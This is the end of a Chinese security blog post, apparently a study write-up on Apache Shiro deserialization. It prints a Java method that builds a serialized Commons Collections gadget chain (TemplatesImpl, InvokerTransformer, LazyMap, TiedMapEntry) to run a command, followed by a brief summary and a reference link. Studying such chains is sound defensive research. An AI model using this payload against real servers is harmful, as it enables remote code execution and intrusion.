<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getPayload(String command) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//getClass方法占位，之后换成newTransformer</span></span><br><span class="line">    <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, templatesImpl);</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">finalMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    finalMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">    outerMap.clear();</span><br><span class="line">    setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">    oos.writeObject(finalMap);</span><br><span class="line">    oos.close();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://b3logfile.com/siyuan/1642857713240/assets/image-20220406022837-asevmym.png" alt="image.png"></p>
<p>成功哈</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本篇其实开了个头,关于shiro还有很多攻击方法和知识.也算是稍微回顾了一下之前学的cc中的知识,感觉还是不错的</p>
<p>积累了LazyMap的新攻击姿势,这里mark一下</p>
<p>困死了,睡觉睡觉</p>
<h1 id="参考-amp-好文"><a href="#参考-amp-好文" class="headerlink" title="参考&amp;好文"></a>参考&amp;好文</h1><p><a target="_blank" rel="noopener" href="http://xiashang.xyz/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/#%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B">http://xiashang.xyz/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/#%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B</a></p>

  </div>
  
    
      <a id="older" class="blog-nav" href="/2022/04/04/cc%E6%80%BB%E7%BB%93/">OLDER&nbsp;&gt;</a>
      
        
          <a id="newer" class="blog-nav" href="/2022/04/06/vnctf2022/">&lt;&nbsp;NEWER</a>
          
            
</div>
        <div class="footer">
  
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/leedom92/hexo-theme-leedom">Copyright © Leedom 2021</a>
        
    </div>
  
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/leedom92/hexo-theme-leedom">Theme by Leedom | Powered by Hexo</a>
        
    </div>
  
</div>

      </div>

      <div class="back-to-top hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



      
  <div class="search-icon" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-box">
        <div class="search-title">
          <!-- <span class="search-icon-input">
            <a href="javascript: void(0)">
              <i class="iconfont icon-search"></i>
            </a>
          </span> -->
          
            <input type="text" class="search-input" id="search-input" placeholder="搜索">
          
          <span class="search-close-icon" id="search-close-icon">
            <a href="javascript: void(0)">
              <i class="iconfont icon-close"></i>
            </a>
          </span>
        </div>
        <div class="search-result" id="search-result"></div>
      </div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    // inputArea.onclick = function() {
    //   getSearchFile()
    //   this.onclick = null
    // }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        inputArea.focus()
        getSearchFile()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'><span></ul>";
      // $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='/" + data_url + "' class='search-result-title'><h2>" + orig_data_title + "</h2></a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<h3 class=\"search-result-abstract\">" + match_content + "...</h3>"
                }
                str += "<hr></li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/leedom92/hexo-theme-leedom#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




    </div>
  </body>
</html>
